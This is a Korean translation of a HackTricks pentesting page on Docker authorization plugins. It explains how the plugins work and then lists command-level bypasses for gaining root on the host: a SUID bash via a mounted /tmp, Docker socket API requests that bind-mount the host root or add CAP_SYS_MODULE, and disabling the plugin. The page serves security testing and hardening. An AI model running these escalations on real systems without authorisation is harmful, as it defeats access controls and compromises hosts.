<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>에서 <strong>제로부터 영웅이 되는 AWS 해킹</strong>을 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>


**Docker**의 기본 **인증** 모델은 **모두 허용 또는 거부**입니다. Docker 데몬에 액세스 권한이 있는 모든 사용자는 **모든** Docker 클라이언트 **명령**을 실행할 수 있습니다. Docker의 Engine API를 사용하여 데몬에 연락하는 호출자에게도 동일한 규칙이 적용됩니다. 더 세밀한 액세스 제어가 필요한 경우, 인증 플러그인을 생성하고 Docker 데몬 구성에 추가할 수 있습니다. 인증 플러그인을 사용하면 Docker 관리자는 Docker 데몬에 대한 액세스 관리를 위한 세밀한 액세스 정책을 구성할 수 있습니다.

# 기본 아키텍처

Docker Auth 플러그인은 Docker 데몬에 요청된 **작업**에 대해 **사용자**와 **작업**에 따라 Docker 데몬에서 요청된 작업을 **허용 또는 거부**할 수 있는 **외부 플러그인**입니다.

**[다음 정보는 문서에서 가져온 것입니다](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

CLI 또는 Engine API를 통해 Docker 데몬에 대한 **HTTP 요청**이 수행되면 **인증 하위 시스템**은 요청을 설치된 **인증 플러그인**에 전달합니다. 요청에는 사용자(호출자)와 명령 컨텍스트가 포함됩니다. 플러그인은 요청을 **허용**할지 **거부**할지 결정하는 역할을 담당합니다.

아래 시퀀스 다이어그램은 허용 및 거부 인증 흐름을 보여줍니다:

![허용 인증 흐름](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![거부 인증 흐름](https://docs.docker.com/engine/extend/images/authz\_deny.png)

플러그인에 전송되는 각 요청에는 **인증된 사용자, HTTP 헤더 및 요청/응답 본문**이 포함됩니다. 플러그인에 전달되는 것은 사용자 이름과 사용된 인증 방법뿐입니다. 중요한 점은 사용자 자격 증명이나 토큰은 전달되지 않는다는 것입니다. 마지막으로, 인증 플러그인에 전송되는 것은 모든 요청/응답 본문이 아닙니다. `Content-Type`이 `text/*` 또는 `application/json`인 요청/응답 본문만 전송됩니다.

`exec`와 같이 HTTP 연결을 탈취할 수 있는 명령(`HTTP Upgrade`)에 대해서는 인증 플러그인이 초기 HTTP 요청에 대해서만 호출됩니다. 플러그인이 명령을 승인하면 나머지 흐름에는 인증이 적용되지 않습니다. 구체적으로, 스트리밍 데이터는 인증 플러그인에 전달되지 않습니다. `logs` 및 `events`와 같이 청크로 나뉘어진 HTTP 응답을 반환하는 명령에 대해서는 HTTP 요청만 인증 플러그인에 전송됩니다.

요청/응답 처리 중에 일부 인증 흐름은 Docker 데몬에 대해 추가 쿼리를 수행해야 할 수 있습니다. 이러한 흐름을 완료하기 위해 플러그인은 일반 사용자와 유사하게 데몬 API를 호출할 수 있어야 합니다. 이러한 추가 쿼리를 활성화하려면 플러그인은 관리자가 적절한 인증 및 보안 정책을 구성할 수 있는 수단을 제공해야 합니다.

## 여러 플러그인

Docker 데몬 **시작** 중에 **플러그인**을 **등록**해야 합니다. 여러 플러그인을 설치하고 연결할 수 있습니다. 이 체인은 순서대로 정렬될 수 있습니다. 데몬에 대한 각 요청은 체인을 통해 순서대로 전달됩니다. 모든 플러그인이 리소스에 대한 액세스를 허용할 때만 액세스가 허용됩니다.

# 플러그인 예제

## Twistlock AuthZ Broker

[**authz**](https://github.com/twistlock/authz) 플러그인을 사용하면 **JSON** 파일을 생성하여 요청을 인증하는 데 사용됩니다. 따라서 각 사용자가 어떤 API 엔드포인트에 액세스할 수 있는지를 매우 쉽게 제어할 수 있습니다.

다음은 Alice와 Bob이 새로운 컨테이너를 생성할 수 있는 예제입니다: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

[route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) 페이지에서 요청된 URL과 작업 간의 관계를 찾을 수 있습니다. [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) 페이지에서 작업 이름과 작업 간의 관계를 찾을 수 있습니다.

## 간단한 플러그인 튜토리얼

[**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)에서 설치 및 디버깅에 대한 자세한 정보가 포함된 **이해하기 쉬운 플러그인**을 찾을 수 있습니다.

작동 방식을 이해하려면 `README`와 `plugin.go` 코드를 읽어보세요.

# Docker Auth 플러그인 우회

## 액세스 열거

**허용된 엔드포인트**와 **HostConfig의 허용된 값**을 확인해야 합니다.

이 열거를 수행하기 위해 [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler) 도구를 사용할 수 있습니다.

## 허용되지 않은 `run --privileged`

### 최소 권한</strong></summary>
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### 컨테이너 실행 및 특권 세션 얻기

이 경우 시스템 관리자는 사용자가 볼륨을 마운트하고 `--privileged` 플래그로 컨테이너를 실행하거나 컨테이너에 추가 기능을 부여하는 것을 금지했습니다.
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
그러나 사용자는 실행 중인 컨테이너 내에서 쉘을 생성하고 추가 권한을 부여할 수 있습니다:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
이제 사용자는 [**이전에 논의된 기술**](./#privileged-flag) 중 하나를 사용하여 컨테이너에서 탈출하고 호스트 내에서 **권한을 상승**시킬 수 있습니다.

## 쓰기 가능한 폴더 마운트

이 경우 시스템 관리자는 사용자가 `--privileged` 플래그로 컨테이너를 실행하거나 컨테이너에 추가 기능을 부여하지 못하도록 허용하지 않았으며, `/tmp` 폴더만 마운트할 수 있도록 허용했습니다:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
참고로 `/tmp` 폴더를 마운트할 수 없을 수도 있지만, **다른 쓰기 가능한 폴더**를 마운트할 수 있습니다. 다음 명령을 사용하여 쓰기 가능한 디렉토리를 찾을 수 있습니다: `find / -writable -type d 2>/dev/null`

**모든 리눅스 머신의 디렉토리가 suid 비트를 지원하는 것은 아닙니다!** suid 비트를 지원하는 디렉토리를 확인하려면 `mount | grep -v "nosuid"` 명령을 실행하십시오. 예를 들어, 일반적으로 `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` 및 `/var/lib/lxcfs`는 suid 비트를 지원하지 않습니다.

또한, **`/etc`를 마운트**하거나 **구성 파일을 포함하는 다른 폴더**를 마운트할 수 있다면, 도커 컨테이너에서 루트로 실행하여 호스트에서 권한 상승을 할 수 있도록 구성 파일을 변경할 수 있습니다 (아마도 `/etc/shadow`를 수정할 수 있음).
{% endhint %}

## 확인되지 않은 API 엔드포인트

이 플러그인을 구성하는 시스템 관리자의 책임은 각 사용자가 어떤 작업을 어떤 권한으로 수행할 수 있는지 제어하는 것입니다. 따라서, 관리자가 엔드포인트와 속성에 대해 **블랙리스트** 접근 방식을 취하면, 권한 상승을 허용할 수 있는 일부 엔드포인트를 **잊어버릴 수 있습니다.**

도커 API를 확인할 수 있습니다. [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## 확인되지 않은 JSON 구조

### 루트에서의 바인드

시스템 관리자가 도커 방화벽을 구성할 때 [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)의 "**Binds**"와 같은 중요한 매개변수를 **빠뜨렸을 수 있습니다.**\
다음 예제에서는 이러한 구성 오류를 악용하여 호스트의 루트 (/) 폴더를 마운트하는 컨테이너를 생성하고 실행할 수 있습니다:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
이 예제에서는 JSON의 루트 수준 키로 **`Binds`** 매개변수를 사용하지만 API에서는 **`HostConfig`** 키 아래에 나타납니다.
{% endhint %}

### HostConfig의 Binds

**루트의 Binds**와 동일한 지침을 따르고 Docker API에 대한 이 **요청**을 수행하세요:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### 루트 디렉토리에 마운트

**루트 디렉토리에 바인드**와 동일한 지침을 따르며 Docker API에 이 **요청**을 수행하십시오:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### HostConfig에서의 Mounts

**루트에서의 바인드**와 동일한 지침을 따르면 Docker API에 이 **요청**을 수행하십시오:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## 확인되지 않은 JSON 속성

시스템 관리자가 도커 방화벽을 구성할 때 [API](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)의 "**HostConfig**" 내부에 있는 "**Capabilities**"와 같은 중요한 매개변수의 속성을 **잊어버릴 수 있습니다**. 다음 예제에서는 이러한 잘못된 구성을 악용하여 **SYS\_MODULE** 기능을 가진 컨테이너를 생성하고 실행할 수 있습니다:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
**`HostConfig`**는 일반적으로 컨테이너에서 탈출하기 위해 사용되는 **중요한** **권한**을 포함하는 주요한 요소입니다. 그러나 이전에 논의한 대로, Binds를 사용하여 제한을 우회할 수도 있으므로 주의하십시오.
{% endhint %}

## 플러그인 비활성화

**시스템 관리자**가 **플러그인**을 **비활성화**하는 것을 **잊어버렸다면**, 이를 완전히 비활성화하는 데 이를 활용할 수 있습니다!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
**승격 후 플러그인을 다시 활성화**하거나 **도커 서비스를 다시 시작**해야 합니다!

## Auth Plugin Bypass writeups

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

## 참고 자료

* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 기법을 공유**하세요.

</details>
